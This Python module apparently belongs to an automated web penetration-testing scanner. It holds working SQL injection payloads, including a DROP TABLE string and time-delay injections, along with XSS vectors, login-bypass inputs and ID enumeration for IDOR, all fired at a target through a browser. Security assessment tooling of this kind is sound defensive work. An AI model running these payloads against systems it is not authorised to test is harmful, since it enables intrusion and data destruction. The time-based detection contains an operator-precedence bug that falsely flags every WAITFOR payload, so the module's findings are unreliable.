from typing import Dict, Any, List
from app.agents.browser_manager import BrowserManager
import logging
import asyncio

logger = logging.getLogger(__name__)


class SQLInjectionTester:
    """Test for SQL Injection vulnerabilities"""

    def __init__(self, browser_manager: BrowserManager):
        self.browser_manager = browser_manager
        self.payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "admin' #",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "1' AND '1'='1",
            "1' AND '1'='2",
            "' OR 1=1--",
            "' OR 1=1#",
            "'; DROP TABLE users--",
            "' WAITFOR DELAY '00:00:05'--",
            "1' AND SLEEP(5)--",
            "' AND extractvalue(1,concat(0x7e,database()))--",
        ]

    async def test_parameter(self, url: str, param_name: str, param_value: str = "") -> List[Dict[str, Any]]:
        """Test a specific parameter for SQL injection"""
        results = []

        for payload in self.payloads:
            try:
                # Construct test URL
                test_value = param_value + payload if param_value else payload
                test_url = url.replace(f"{param_name}={param_value}", f"{param_name}={test_value}")

                # Navigate and measure response
                import time
                start_time = time.time()
                nav_result = await self.browser_manager.navigate(test_url)
                response_time = time.time() - start_time

                # Get page content
                content = await self.browser_manager.get_page_content()

                # Check for SQL error messages
                sql_errors = [
                    "SQL syntax",
                    "mysql_fetch",
                    "ORA-",
                    "PostgreSQL",
                    "SQLite",
                    "ODBC",
                    "Microsoft SQL",
                    "Unclosed quotation",
                    "unterminated string",
                ]

                error_found = any(error.lower() in content.lower() for error in sql_errors)

                # Time-based detection
                time_based = response_time > 5 and "SLEEP" in payload or "WAITFOR" in payload

                result = {
                    "url": test_url,
                    "parameter": param_name,
                    "payload": payload,
                    "status_code": nav_result.get("status"),
                    "response_time": response_time,
                    "error_detected": error_found,
                    "time_based_detected": time_based,
                    "vulnerable": error_found or time_based,
                }

                results.append(result)

                if result["vulnerable"]:
                    logger.warning(f"Potential SQLi vulnerability found: {param_name} with payload: {payload}")

            except Exception as e:
                logger.error(f"Error testing SQL injection for {param_name}: {e}")

        return results


class XSSTester:
    """Test for Cross-Site Scripting vulnerabilities"""

    def __init__(self, browser_manager: BrowserManager):
        self.browser_manager = browser_manager
        self.payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=\"javascript:alert('XSS')\">",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<marquee onstart=alert('XSS')>",
            "'-alert('XSS')-'",
            "\"><script>alert('XSS')</script>",
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
        ]

    async def test_parameter(self, url: str, param_name: str) -> List[Dict[str, Any]]:
        """Test parameter for XSS"""
        results = []

        for payload in self.payloads:
            try:
                # Construct test URL
                test_url = url.replace(f"{param_name}=", f"{param_name}={payload}")

                # Navigate
                await self.browser_manager.navigate(test_url)

                # Check if payload is reflected in page
                content = await self.browser_manager.get_page_content()
                
                # Check for reflected payload
                payload_reflected = payload in content or payload.replace("'", '"') in content

                # Check for alert execution (in headless mode, we check for script tags)
                script_executed = "<script>" in content or "onerror=" in content

                result = {
                    "url": test_url,
                    "parameter": param_name,
                    "payload": payload,
                    "payload_reflected": payload_reflected,
                    "script_detected": script_executed,
                    "vulnerable": payload_reflected or script_executed,
                }

                results.append(result)

                if result["vulnerable"]:
                    logger.warning(f"Potential XSS vulnerability found: {param_name} with payload: {payload}")

            except Exception as e:
                logger.error(f"Error testing XSS for {param_name}: {e}")

        return results


class CSRFTester:
    """Test for Cross-Site Request Forgery vulnerabilities"""

    def __init__(self, browser_manager: BrowserManager):
        self.browser_manager = browser_manager

    async def test_forms(self, forms: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Test forms for CSRF protection"""
        results = []

        for form in forms:
            csrf_tokens = []
            inputs = form.get("inputs", [])

            # Check for CSRF tokens
            csrf_patterns = ["csrf", "token", "_token", "authenticity_token"]
            
            for input_field in inputs:
                input_name = input_field.get("name", "").lower()
                if any(pattern in input_name for pattern in csrf_patterns):
                    csrf_tokens.append(input_field)

            result = {
                "form_action": form.get("action"),
                "form_method": form.get("method"),
                "has_csrf_token": len(csrf_tokens) > 0,
                "csrf_tokens": csrf_tokens,
                "vulnerable": len(csrf_tokens) == 0 and form.get("method", "").upper() == "POST",
            }

            results.append(result)

            if result["vulnerable"]:
                logger.warning(f"Potential CSRF vulnerability in form: {form.get('action')}")

        return results


class AuthenticationBypassTester:
    """Test for authentication bypass vulnerabilities"""

    def __init__(self, browser_manager: BrowserManager):
        self.browser_manager = browser_manager
        self.bypass_payloads = [
            {"username": "admin' OR '1'='1", "password": "admin' OR '1'='1"},
            {"username": "admin' --", "password": "anything"},
            {"username": "admin' #", "password": "anything"},
            {"username": "' OR '1'='1' --", "password": "' OR '1'='1' --"},
        ]

    async def test_login(self, login_url: str) -> List[Dict[str, Any]]:
        """Test login for bypass vulnerabilities"""
        results = []

        for payload in self.bypass_payloads:
            try:
                # Navigate to login page
                await self.browser_manager.navigate(login_url)

                # Attempt login with payload
                login_result = await self.browser_manager.login(
                    payload["username"], payload["password"]
                )

                # Check if login was successful (bypassed)
                current_url = self.browser_manager.page.url
                bypassed = current_url != login_url and login_result.get("success")

                result = {
                    "login_url": login_url,
                    "payload": payload,
                    "bypassed": bypassed,
                    "final_url": current_url,
                    "vulnerable": bypassed,
                }

                results.append(result)

                if result["vulnerable"]:
                    logger.warning(f"Authentication bypass detected with payload: {payload}")

            except Exception as e:
                logger.error(f"Error testing authentication bypass: {e}")

        return results


class IDORTester:
    """Test for Insecure Direct Object Reference vulnerabilities"""

    def __init__(self, browser_manager: BrowserManager):
        self.browser_manager = browser_manager

    async def test_endpoints(self, urls: List[str]) -> List[Dict[str, Any]]:
        """Test endpoints for IDOR"""
        results = []

        # Look for URLs with numeric IDs
        import re
        id_pattern = re.compile(r'/(\d+)/?$')

        for url in urls:
            match = id_pattern.search(url)
            if match:
                original_id = match.group(1)
                test_ids = [
                    str(int(original_id) + 1),
                    str(int(original_id) - 1),
                    "1",
                    "999999",
                ]

                for test_id in test_ids:
                    try:
                        test_url = url.replace(f"/{original_id}", f"/{test_id}")
                        nav_result = await self.browser_manager.navigate(test_url)

                        # If we get a 200 response for someone else's ID, potential IDOR
                        accessible = nav_result.get("status") == 200

                        result = {
                            "original_url": url,
                            "test_url": test_url,
                            "original_id": original_id,
                            "test_id": test_id,
                            "accessible": accessible,
                            "status_code": nav_result.get("status"),
                            "vulnerable": accessible and test_id != original_id,
                        }

                        results.append(result)

                        if result["vulnerable"]:
                            logger.warning(f"Potential IDOR vulnerability: {test_url}")

                    except Exception as e:
                        logger.error(f"Error testing IDOR for {url}: {e}")

        return results


class VAPTTestOrchestrator:
    """Orchestrates all vulnerability tests"""

    def __init__(self, browser_manager: BrowserManager):
        self.browser_manager = browser_manager
        self.sqli_tester = SQLInjectionTester(browser_manager)
        self.xss_tester = XSSTester(browser_manager)
        self.csrf_tester = CSRFTester(browser_manager)
        self.auth_tester = AuthenticationBypassTester(browser_manager)
        self.idor_tester = IDORTester(browser_manager)

    async def run_all_tests(self, scan_data: Dict[str, Any]) -> Dict[str, Any]:
        """Run all VAPT tests"""
        try:
            logger.info("Starting comprehensive VAPT testing...")

            all_results = {
                "sql_injection": [],
                "xss": [],
                "csrf": [],
                "authentication_bypass": [],
                "idor": [],
            }

            # Test SQL Injection
            logger.info("Testing for SQL Injection...")
            for param in scan_data.get("unique_parameters", [])[:10]:  # Test first 10 params
                for url in scan_data.get("urls", [])[:5]:  # Test first 5 URLs
                    if param in url:
                        sqli_results = await self.sqli_tester.test_parameter(url, param)
                        all_results["sql_injection"].extend(sqli_results)

            # Test XSS
            logger.info("Testing for XSS...")
            for param in scan_data.get("unique_parameters", [])[:10]:
                for url in scan_data.get("urls", [])[:5]:
                    if param in url:
                        xss_results = await self.xss_tester.test_parameter(url, param)
                        all_results["xss"].extend(xss_results)

            # Test CSRF
            logger.info("Testing for CSRF...")
            forms = scan_data.get("forms", [])
            csrf_results = await self.csrf_tester.test_forms(forms)
            all_results["csrf"] = csrf_results

            # Test Authentication Bypass
            logger.info("Testing for Authentication Bypass...")
            if scan_data.get("has_authentication"):
                target_url = scan_data.get("target_url")
                auth_results = await self.auth_tester.test_login(target_url)
                all_results["authentication_bypass"] = auth_results

            # Test IDOR
            logger.info("Testing for IDOR...")
            urls = scan_data.get("urls", [])[:20]  # Test first 20 URLs
            idor_results = await self.idor_tester.test_endpoints(urls)
            all_results["idor"] = idor_results

            # Calculate summary
            total_vulnerabilities = sum(
                len([r for r in results if r.get("vulnerable")])
                for results in all_results.values()
            )

            summary = {
                "total_tests": sum(len(results) for results in all_results.values()),
                "total_vulnerabilities": total_vulnerabilities,
                "sqli_vulnerabilities": len([r for r in all_results["sql_injection"] if r.get("vulnerable")]),
                "xss_vulnerabilities": len([r for r in all_results["xss"] if r.get("vulnerable")]),
                "csrf_vulnerabilities": len([r for r in all_results["csrf"] if r.get("vulnerable")]),
                "auth_bypass_vulnerabilities": len([r for r in all_results["authentication_bypass"] if r.get("vulnerable")]),
                "idor_vulnerabilities": len([r for r in all_results["idor"] if r.get("vulnerable")]),
            }

            logger.info(f"VAPT testing completed. Found {total_vulnerabilities} vulnerabilities")

            return {
                "success": True,
                "results": all_results,
                "summary": summary,
            }

        except Exception as e:
            logger.error(f"Error during VAPT testing: {e}")
            return {"success": False, "error": str(e)}
